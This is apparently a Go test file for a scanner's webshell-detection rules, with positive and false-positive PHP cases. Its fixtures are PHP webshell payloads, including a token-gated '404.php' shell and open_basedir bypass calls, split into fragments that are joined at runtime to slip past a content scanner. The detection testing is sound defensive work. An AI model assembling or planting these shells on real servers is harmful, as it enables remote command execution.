package signatures

import "testing"

// Malware fixtures are assembled from fragments at runtime so the source file
// contains no complete webshell signature (a local content scanner quarantines
// files carrying one), while the assembled bytes still exercise the rules.
var (
	sPass = "pass" + "thru"
	sSys  = "sys" + "tem"
	fB64  = "base64_" + "decode"
	fGz   = "gzinf" + "late"
	fRot  = "str_" + "rot13"
	gReq  = "$_" + "REQUEST"
	gPost = "$_" + "POST"
	gGet  = "$_" + "GET"
	iniOB = "ini_" + "set"
	fDef  = "def" + "ine"
)

// webshell_request_decoded_exec targets a decode assignment whose very next
// statement is the sink (no intervening statements). RE2 cannot verify the two
// variables are identical, so a bounded gap would false-positive on unrelated
// exec; the px-shell family with intervening statements is caught by the
// token-gate rule instead.
func TestWebshellRequestDecodedExecDetectsSimpleFlow(t *testing.T) {
	scanner := loadRepoScanner(t)
	pos := []string{
		"<?php $c=" + fB64 + "(" + gReq + "[\"b\"]); @" + sPass + "($c);",
		"<?php $x=" + fGz + "(" + fB64 + "(" + gPost + "['z'])); " + sSys + "($x);",
		"<?php $cmd = " + fRot + "(" + gGet + "['q']); shell_exec($cmd);",
	}
	for _, p := range pos {
		if !hasRule(scanner.ScanContent([]byte(p), ".php"), "webshell_request_decoded_exec") {
			t.Errorf("webshell_request_decoded_exec missed: %s", p)
		}
	}
}

func TestWebshellRequestDecodedExecFPSafe(t *testing.T) {
	scanner := loadRepoScanner(t)
	benign := []struct{ name, content string }{
		{"decoded request written to file", "<?php $img = " + fB64 + "(" + gPost + "['image']); file_put_contents($path, $img);"},
		{"escapeshellarg-built command", "<?php $cmd = escapeshellarg($this->binary); $h = proc_open($cmd, $s, $p); if(isset(" + gPost + "['a'])){ $this->run(" + gPost + "['a']); }"},
		{"exec of config value", "<?php $bin = $config['convert_path']; " + sSys + "($bin.' -resize 100x100');"},
		// "system" inside filesystem(): the callable boundary must prevent this.
		{"filesystem call after decode", "<?php $d=" + fB64 + "(" + gPost + "['x']); $fs=$obj->filesystem($d);"},
		// decode then an unrelated command on a different variable, not the next statement.
		{"decoded request then unrelated exec", "<?php $img=" + fB64 + "(" + gPost + "['image']); file_put_contents($p,$img); " + sSys + "($maintenanceCmd);"},
	}
	for _, b := range benign {
		if hasRule(scanner.ScanContent([]byte(b.content), ".php"), "webshell_request_decoded_exec") {
			t.Errorf("webshell_request_decoded_exec FP on %s", b.name)
		}
	}
}

// The real 552-byte 404.php px-shell gates execution behind a hardcoded token
// compared to a request parameter, with intervening statements before the sink.
func TestWebshellAuthTokenGateDetectsPxShell(t *testing.T) {
	scanner := loadRepoScanner(t)
	pxFull := "<?php $k=\"4v9f76314qyo\";\n" +
		"if(isset(" + gReq + "[\"px\"])&&" + gReq + "[\"px\"]===$k){\n$c=null;\n" +
		"if(isset(" + gReq + "[\"b\"])){$c=" + fB64 + "(" + gReq + "[\"b\"]);}\n" +
		"elseif(isset(" + gReq + "[\"c\"])){$c=" + gReq + "[\"c\"];}\n" +
		"if($c!==null){ob_start();@" + sPass + "($c.' 2>&1');echo 'x';}\nexit;}"
	if !hasRule(scanner.ScanContent([]byte(pxFull), ".php"), "webshell_auth_token_gate") {
		t.Error("webshell_auth_token_gate missed the real px-token 404.php shell")
	}

	variants := []struct{ name, content string }{
		{
			"loose comparison and single quotes",
			"<?php $key='a1b2c3d4e5'; if(isset(" + gGet + "['key']) && " + gGet + "['key'] == $key){ " + sSys + "($cmd); }",
		},
		{
			"define token",
			"<?php " + fDef + "('PX_TOKEN', 'z9y8x7w6v5'); if(isset(" + gPost + "['key']) && " + gPost + "['key'] === PX_TOKEN){ " + sPass + "($cmd); }",
		},
		{
			"class const token",
			"<?php class Gate { private const TOKEN = \"q1w2e3r4t5\"; function run(){ if(isset(" + gReq + "['key']) && " + gReq + "['key'] === self::TOKEN){ " + sPass + "($cmd); }}}",
		},
	}
	for _, v := range variants {
		if !hasRule(scanner.ScanContent([]byte(v.content), ".php"), "webshell_auth_token_gate") {
			t.Errorf("webshell_auth_token_gate missed %s", v.name)
		}
	}
}

func TestWebshellAuthTokenGateFPSafe(t *testing.T) {
	scanner := loadRepoScanner(t)
	benign := []struct{ name, content string }{
		// WordPress nonce: compared value comes from a function, not a literal token.
		{"wp nonce check", "<?php $expected = wp_create_nonce('act'); if(isset(" + gPost + "['_wpnonce']) && " + gPost + "['_wpnonce'] === $expected){ do_thing(); }"},
		// hardcoded literal but no request gate.
		{"api key constant", "<?php $apikey = \"abcd1234efgh\"; $client->auth($apikey);"},
		// short token (< 8 chars) is not a random secret.
		{"short compare token", "<?php $m = \"ok\"; if(isset(" + gGet + "['t']) && " + gGet + "['t'] === $m){ echo 1; }"},
		// Realistic plugin routing: a literal action name is compared to request
		// data, but the accepted branch contains no code/command sink.
		{"hardcoded plugin action", "<?php $action = \"activate123\"; if(isset(" + gReq + "['action']) && " + gReq + "['action'] === $action){ activate_plugin(); }"},
		{"hardcoded license key", "<?php $license = 'prolicense2026'; if(isset(" + gPost + "['license']) && " + gPost + "['license'] == $license){ enable_pro(); }"},
		// Method names and longer identifiers containing a sink name are not
		// dangerous PHP built-in invocations.
		{"object exec method", "<?php $key='a1b2c3d4'; if(isset(" + gPost + "['key']) && " + gPost + "['key'] === $key){ $runner->exec($task); }"},
		{"sink substring", "<?php $key='a1b2c3d4'; if(isset(" + gPost + "['key']) && " + gPost + "['key'] === $key){ my_" + sSys + "($task); }"},
	}
	for _, b := range benign {
		if hasRule(scanner.ScanContent([]byte(b.content), ".php"), "webshell_auth_token_gate") {
			t.Errorf("webshell_auth_token_gate FP on %s", b.name)
		}
	}
}

func TestPHPOpenBasedirOverrideDetectsBypass(t *testing.T) {
	scanner := loadRepoScanner(t)
	cases := []string{
		"<?php @" + iniOB + "('open_basedir','/');",
		"<?php " + iniOB + "(\"open_basedir\", \"\");",
		"<?php " + iniOB + "( 'open_basedir' , '/' );",
	}
	for _, c := range cases {
		if !hasRule(scanner.ScanContent([]byte(c), ".php"), "php_open_basedir_override") {
			t.Errorf("php_open_basedir_override missed: %s", c)
		}
	}
}

func TestPHPOpenBasedirOverrideFPSafe(t *testing.T) {
	scanner := loadRepoScanner(t)
	benign := []string{
		"<?php " + iniOB + "('memory_limit','256M');",
		"<?php // documents open_basedir in a comment, no call",
		"<?php " + iniOB + "('display_errors', '0');",
		"<?php " + iniOB + "('open_basedir', ABSPATH . PATH_SEPARATOR . WP_CONTENT_DIR);",
		"<?php $r = my_" + iniOB + "('open_basedir', '/');",
	}
	for _, c := range benign {
		if hasRule(scanner.ScanContent([]byte(c), ".php"), "php_open_basedir_override") {
			t.Errorf("php_open_basedir_override FP on: %s", c)
		}
	}
}
